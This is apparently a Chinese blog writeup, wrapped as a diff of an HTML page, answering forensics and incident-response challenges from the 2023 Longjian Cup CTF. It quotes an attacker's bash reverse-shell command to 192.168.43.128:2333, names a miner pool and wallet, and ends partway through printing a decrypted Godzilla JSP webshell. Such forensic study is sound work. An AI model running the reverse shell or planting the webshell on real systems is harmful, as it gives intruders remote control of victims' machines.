@@ -1,0 +1,405 @@
+<!DOCTYPE html><html lang="en"> <head><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>陇剑杯 2023 Writeup</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><meta name="generator" content="Astro v5.9.0"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/longjiancup-2023/"><title>陇剑杯 2023 Writeup
+
+
+
+<!-- Open Graph / Facebook -->
+
+
+
+
+
+<!-- Twitter -->
+
+
+
+</title><meta name="title" content="陇剑杯 2023 Writeup"><meta name="description" content><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/longjiancup-2023/"><meta property="og:title" content="陇剑杯 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/longjiancup-2023/"><meta property="twitter:title" content="陇剑杯 2023 Writeup"><meta property="twitter:description" content><link rel="stylesheet" href="/_astro/_slug_.D2NkKxuK.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.D48ksWp2.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <!-- Global Metadata --> <!-- Font preloads --> <!-- Canonical URL --> <!-- Primary Meta Tags --> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const n=a.getElementsByTagName("img");Array.from(n).forEach(e=>{const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <!-- 桌面端导航 --> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 移动端菜单按钮 --> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <!-- 移动端下拉菜单 --> <div id="menu" class="md:hidden absolute top-full left-0 w-full bg-white dark:bg-gray-900 shadow-lg border-t dark:border-gray-700 hidden" data-astro-cid-3ef6ksr2> <div class="flex flex-col py-2" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-2 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),t=document.getElementById("menu");e?.addEventListener("click",()=>{t?.classList.toggle("hidden"),e.classList.toggle("open")});document.addEventListener("click",n=>{!e?.contains(n.target)&&!t?.contains(n.target)&&(t?.classList.add("hidden"),e?.classList.remove("open"))});</script>  <main class="min-h-screen"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> 陇剑杯 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-08-26T22:21:27.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2023-08-26T22:21:27.000Z"> Aug 27, 2023 </time> </time> <span class="text-[#d2d2d7] flex items-center">|</span>
+							
+							<div class="flex items-center"> <span class="flex items-center"> <a href="/categories/技术/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 技术 </a>  </span> </div>  <span class="text-[#d2d2d7] flex items-center">|</span> <div class="flex items-center"> <span class="flex items-center"> <a href="/tags/CTF/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> CTF </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/Writeup/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> Writeup </a> <span class="text-[#d2d2d7] mx-2">·</span> </span><span class="flex items-center"> <a href="/tags/网络安全/" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light"> 网络安全 </a>  </span> </div>  </div> </header>  <nav class="toc" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#ss" class="toc-link" data-astro-cid-woz2nwfv> 1. SS </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#sevrer-save_1" class="toc-link" data-astro-cid-woz2nwfv> 1.1. sevrer save_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_2" class="toc-link" data-astro-cid-woz2nwfv> 1.2. sevrer save_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_3" class="toc-link" data-astro-cid-woz2nwfv> 1.3. sevrer save_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_4" class="toc-link" data-astro-cid-woz2nwfv> 1.4. sevrer save_4 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_5" class="toc-link" data-astro-cid-woz2nwfv> 1.5. sevrer save_5 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_6" class="toc-link" data-astro-cid-woz2nwfv> 1.6. sevrer save_6 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_7" class="toc-link" data-astro-cid-woz2nwfv> 1.7. sevrer save_7 </a> </li><li data-astro-cid-woz2nwfv> <a href="#sevrer-save_5-1" class="toc-link" data-astro-cid-woz2nwfv> 1.8. sevrer save_5 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#ws" class="toc-link" data-astro-cid-woz2nwfv> 2. WS </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#wireshark1_1" class="toc-link" data-astro-cid-woz2nwfv> 2.1. Wireshark1_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#wireshark1_2" class="toc-link" data-astro-cid-woz2nwfv> 2.2. Wireshark1_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#wireshark1_3" class="toc-link" data-astro-cid-woz2nwfv> 2.3. Wireshark1_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#wireshark1_4" class="toc-link" data-astro-cid-woz2nwfv> 2.4. Wireshark1_4 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#ir" class="toc-link" data-astro-cid-woz2nwfv> 3. IR </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#incidentresponse_1" class="toc-link" data-astro-cid-woz2nwfv> 3.1. IncidentResponse_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_2" class="toc-link" data-astro-cid-woz2nwfv> 3.2. IncidentResponse_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_3" class="toc-link" data-astro-cid-woz2nwfv> 3.3. IncidentResponse_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_4" class="toc-link" data-astro-cid-woz2nwfv> 3.4. IncidentResponse_4 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_5" class="toc-link" data-astro-cid-woz2nwfv> 3.5. IncidentResponse_5 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_6" class="toc-link" data-astro-cid-woz2nwfv> 3.6. IncidentResponse_6 </a> </li><li data-astro-cid-woz2nwfv> <a href="#incidentresponse_7" class="toc-link" data-astro-cid-woz2nwfv> 3.7. IncidentResponse_7 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#hw" class="toc-link" data-astro-cid-woz2nwfv> 4. HW </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#hard_web_1" class="toc-link" data-astro-cid-woz2nwfv> 4.1. hard_web_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#hard_web_2" class="toc-link" data-astro-cid-woz2nwfv> 4.2. hard_web_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#hard_web_3" class="toc-link" data-astro-cid-woz2nwfv> 4.3. hard_web_3 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#sw" class="toc-link" data-astro-cid-woz2nwfv> 5. SW </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#smallsword_1" class="toc-link" data-astro-cid-woz2nwfv> 5.1. SmallSword_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#smallsword_2" class="toc-link" data-astro-cid-woz2nwfv> 5.2. SmallSword_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#smallsword_3" class="toc-link" data-astro-cid-woz2nwfv> 5.3. SmallSword_3 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#ew" class="toc-link" data-astro-cid-woz2nwfv> 6. EW </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#ez_web_1" class="toc-link" data-astro-cid-woz2nwfv> 6.1. ez_web_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#ez_web_2" class="toc-link" data-astro-cid-woz2nwfv> 6.2. ez_web_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#ez_web_3" class="toc-link" data-astro-cid-woz2nwfv> 6.3. ez_web_3 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#bf" class="toc-link" data-astro-cid-woz2nwfv> 7. BF </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#baby_forensics_1" class="toc-link" data-astro-cid-woz2nwfv> 7.1. baby_forensics_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#baby_forensics_2" class="toc-link" data-astro-cid-woz2nwfv> 7.2. baby_forensics_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#baby_forensics_3" class="toc-link" data-astro-cid-woz2nwfv> 7.3. baby_forensics_3 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#tp" class="toc-link" data-astro-cid-woz2nwfv> 8. TP </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#tcpdump_1" class="toc-link" data-astro-cid-woz2nwfv> 8.1. tcpdump_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#tcpdump_2" class="toc-link" data-astro-cid-woz2nwfv> 8.2. tcpdump_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#tcpdump_3" class="toc-link" data-astro-cid-woz2nwfv> 8.3. tcpdump_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#tcpdump_4" class="toc-link" data-astro-cid-woz2nwfv> 8.4. tcpdump_4 </a> </li><li data-astro-cid-woz2nwfv> <a href="#tcpdump_5" class="toc-link" data-astro-cid-woz2nwfv> 8.5. tcpdump_5 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#hd" class="toc-link" data-astro-cid-woz2nwfv> 9. HD </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#hacked_1" class="toc-link" data-astro-cid-woz2nwfv> 9.1. hacked_1 </a> </li><li data-astro-cid-woz2nwfv> <a href="#hacked_2" class="toc-link" data-astro-cid-woz2nwfv> 9.2. hacked_2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#hacked_3" class="toc-link" data-astro-cid-woz2nwfv> 9.3. hacked_3 </a> </li><li data-astro-cid-woz2nwfv> <a href="#hacked_4" class="toc-link" data-astro-cid-woz2nwfv> 9.4. hacked_4 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link" data-astro-cid-woz2nwfv> 10. Web </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#fungame" class="toc-link" data-astro-cid-woz2nwfv> 10.1. fungame </a> </li> </ol> </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <div id="article" class="prose prose-lg max-w-none">   <p>题量非常多，师傅们也非常猛~ 整体来说陇剑杯大部分题目对新手还是挺友好的，可能大家最大的问题就是时间完全不够用2333，另外不清楚为什么那么多公司看重这比赛，很多联系代打的，理解不能( <!--more--></p>
+<h2 id="ss">SS</h2>
+<p>这个方向给了俩文件 <code>do.tar</code> 和 <code>final.pcap</code>，分别为 Linux 所有目录文件的备份以及网站流量包，但是在做题的时候基本只看 <code>do.tar</code> 就够了</p>
+<h3 id="sevrer-save_1">sevrer save_1</h3>
+<blockquote>
+<p>黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/helloworld/src/main/resources/templates/hello.html</span></span>
+<span class="line"><span>通过该文件里面的 Reznok's Hello World Spring Application 尝试 Github 搜索，发现为 CVE-2022-22965</span></span></code></pre>
+<h3 id="sevrer-save_2">sevrer save_2</h3>
+<blockquote>
+<p>黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/helloworld/bbbb.sh 里得到命令</span></span>
+<span class="line"><span>/bin/sh -i >&#x26; /dev/tcp/192.168.43.128/2333 0>&#x26;1</span></span>
+<span class="line"><span>最终答案</span></span>
+<span class="line"><span>192.168.43.128:2333</span></span></code></pre>
+<h3 id="sevrer-save_3">sevrer save_3</h3>
+<blockquote>
+<p>黑客的病毒名称是什么？ 格式为：filename</p>
+</blockquote>
+<p>一看是没找到，先做的后面题目，根据后面的答案猜到了正确答案，病毒在 <code>home/guests</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>main</span></span></code></pre>
+<h3 id="sevrer-save_4">sevrer save_4</h3>
+<blockquote>
+<p>黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/etc/shadow 分别得到账号密码</span></span>
+<span class="line"><span>ll:openssl passwd -1 -salt 'salt' 123456:19560:0:99999:7:::</span></span>
+<span class="line"><span>最终答案</span></span>
+<span class="line"><span>ll:123456</span></span></code></pre>
+<h3 id="sevrer-save_5">sevrer save_5</h3>
+<blockquote>
+<p>服务器在被入侵时外网ip是多少? 格式为：10.10.0.1</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/home/guests/.log.txt</span></span>
+<span class="line"><span>得到外网ip</span></span>
+<span class="line"><span>172.105.202.239</span></span></code></pre>
+<h3 id="sevrer-save_6">sevrer save_6</h3>
+<blockquote>
+<p>病毒运行后释放了什么文件？格式：文件1,文件2</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>在 /home/guests/.idea 释放了俩文件</span></span>
+<span class="line"><span>lolMiner 和 mine_doge.sh</span></span></code></pre>
+<h3 id="sevrer-save_7">sevrer save_7</h3>
+<blockquote>
+<p>矿池地址是什么？ 格式：domain:1234</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>home/guests/.idea/mine_doge.sh</span></span>
+<span class="line"><span>得到矿池地址</span></span>
+<span class="line"><span>doge.millpools.cc:5567</span></span></code></pre>
+<h3 id="sevrer-save_5-1">sevrer save_5</h3>
+<blockquote>
+<p>黑客的钱包地址是多少？格式：xx:xxxxxxxx</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/home/guests/.idea/mine_doge.sh</span></span>
+<span class="line"><span>得到钱包地址</span></span>
+<span class="line"><span>DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9</span></span></code></pre>
+<h2 id="ws">WS</h2>
+<h3 id="wireshark1_1">Wireshark1_1</h3>
+<blockquote>
+<p>被入侵主机的IP是？</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>192.168.246.28</span></span></code></pre>
+<h3 id="wireshark1_2">Wireshark1_2</h3>
+<blockquote>
+<p>被入侵主机的口令是？</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>youcannevergetthis</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826183404047.png" alt="image-20230826183404047"></p>
+<h3 id="wireshark1_3">Wireshark1_3</h3>
+<blockquote>
+<p>用户目录下第二个文件夹的名称是？</p>
+</blockquote>
+<p>图片如上，第二个文件夹为</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Downloads</span></span></code></pre>
+<h3 id="wireshark1_4">Wireshark1_4</h3>
+<blockquote>
+<p>/etc/passwd中倒数第二个用户的用户名是？</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>mysql</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826183346264.png" alt="image-20230826183346264"></p>
+<h2 id="ir">IR</h2>
+<p>该题目给了一个 <code>ova</code> 镜像，可以直接导入 Vmware 之中，但是着实不方便，所有一直想着直接把文件目录全部拿出来，直接使用 R-studio 对 <code>ova</code> 里面的 <code>vmdx</code> 文件进行恢复，从而得到所有文件。</p>
+<h3 id="incidentresponse_1">IncidentResponse_1</h3>
+<blockquote>
+<p>你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）</p>
+<p>挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<p>直接使用杀软对整个文件系统进行木马查杀，得到挖矿程序</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/etc/redis/redis-server</span></span>
+<span class="line"><span>6f72038a870f05cbf923633066e48881</span></span></code></pre>
+<h3 id="incidentresponse_2">IncidentResponse_2</h3>
+<blockquote>
+<p>挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<p>这种一般和挖矿程序在同一目录，在 <code>redis.conf</code> 中发现域名</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>donate.v2.xmrig.com</span></span>
+<span class="line"><span>3fca20bb92d0ed67714e68704a0a4503</span></span></code></pre>
+<h3 id="incidentresponse_3">IncidentResponse_3</h3>
+<blockquote>
+<p>攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+<p>题目提示：答案md5值前两位为3e</p>
+</blockquote>
+<p>这题比较迷惑，一开始就确定铁定是 shiro 反序列化漏洞了，判定依据为攻击者最终攻击的为登陆页面，其次该系统使用的 <code>renren-security</code> 也确实采用了 Shiro 框架，同时系统运行日志 <code>nohup.log</code> 也报错爆出了 <code>RememberMe</code> ，但始终回答不对，最终根据 hint 试出了最终答案</p>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826175530671.png" alt="image-20230826175530671"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>shirodeserialization</span></span>
+<span class="line"><span>3ee726cb32f87a15d22fe55fa04c4dcd</span></span></code></pre>
+<h3 id="incidentresponse_4">IncidentResponse_4</h3>
+<blockquote>
+<p>攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<p>全局检索日志文件，得到 <code>/var/log/nginx/access.log</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>find / -name 'access.log'</span></span></code></pre>
+<p>通过分析日志响应的状态码，得到攻击者IP</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>81.70.166.3</span></span>
+<span class="line"><span>c76b4b1a5e8c9e7751af4684c6a8b2c9</span></span></code></pre>
+<h3 id="incidentresponse_5">IncidentResponse_5</h3>
+<blockquote>
+<p>攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<p>直接 log 文件末尾得到正确的 UA</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)</span></span>
+<span class="line"><span>6ba8458f11f4044cce7a621c085bb3c6</span></span></code></pre>
+<p><img src="https://img.5ime.cn/longjiancup-2023/image-20230826180107720.png" alt="image-20230826180107720"></p>
+<h3 id="incidentresponse_6">IncidentResponse_6</h3>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<p>找来找去，总共俩用户 <code>root</code> 和 <code>superuser</code> 而 <code>root</code> 用户的 <code>authorized_keys</code> 不为空，判定为权限维持手段之一</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/root/.ssh/authorized_keys</span></span>
+<span class="line"><span>a1fa1b5aeb1f97340032971c342c4258</span></span></code></pre>
+<h3 id="incidentresponse_7">IncidentResponse_7</h3>
+<blockquote>
+<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ’ ’ -f1获取md5值作为答案）</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>find / -newermt '2023-07-23 16:38:10' ! -newermt '2023-07-23 19:38:10'</span></span></code></pre>
+<p>使用命令查到到 <code>redis.service</code> 文件</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>/lib/systemd/system/redis.service</span></span>
+<span class="line"><span>b2c5af8ce08753894540331e5a947d35</span></span></code></pre>
+<h2 id="hw">HW</h2>
+<h3 id="hard_web_1">hard_web_1</h3>
+<blockquote>
+<p>服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)</p>
+</blockquote>
+<p>直接使用表达式进行过滤即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>tcp.connection.synack and ip.dst==192.168.162.188</span></span></code></pre>
+<p>得到如下三个端口</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>80,888,8888	</span></span></code></pre>
+<h3 id="hard_web_2">hard_web_2</h3>
+<blockquote>
+<p>服务器中根目录下的flag值是多少？</p>
+</blockquote>
+<p>哥斯拉的 JSP 流量，解密最后一个 Jsp 流量即可</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{9236b29d-5488-41e6-a04b-53b0d8276542}</span></span></code></pre>
+<h3 id="hard_web_3">hard_web_3</h3>
+<blockquote>
+<p>该webshell的连接密码是多少？</p>
+</blockquote>
+<p>解密流量发现关键信息 <code>748007e861908c03</code> 同时还发现 <code>the key is 1****y // 748007e861908c03</code></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#F97583">&#x3C;%!</span><span style="color:#E1E4E8"> String xc</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"748007e861908c03"</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">class</span><span style="color:#B392F0"> X</span><span style="color:#F97583"> extends</span><span style="color:#B392F0"> ClassLoader</span><span style="color:#E1E4E8">{</span><span style="color:#F97583">public</span><span style="color:#B392F0"> X</span><span style="color:#E1E4E8">(ClassLoader </span><span style="color:#FFAB70">z</span><span style="color:#E1E4E8">){</span><span style="color:#79B8FF">super</span><span style="color:#E1E4E8">(z);}</span><span style="color:#F97583">public</span><span style="color:#E1E4E8"> Class </span><span style="color:#B392F0">Q</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">byte</span><span style="color:#E1E4E8">[] </span><span style="color:#FFAB70">cb</span><span style="color:#E1E4E8">){</span><span style="color:#F97583">return</span><span style="color:#79B8FF"> super</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">defineClass</span><span style="color:#E1E4E8">(cb, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, cb.length);} }</span><span style="color:#F97583">public</span><span style="color:#F97583"> byte</span><span style="color:#E1E4E8">[] </span><span style="color:#B392F0">x</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">byte</span><span style="color:#E1E4E8">[] s,</span><span style="color:#F97583">boolean</span><span style="color:#E1E4E8"> m){ </span><span style="color:#F97583">try</span><span style="color:#E1E4E8">{javax.crypto.Cipher c</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">javax.crypto.Cipher.</span><span style="color:#B392F0">getInstance</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"AES"</span><span 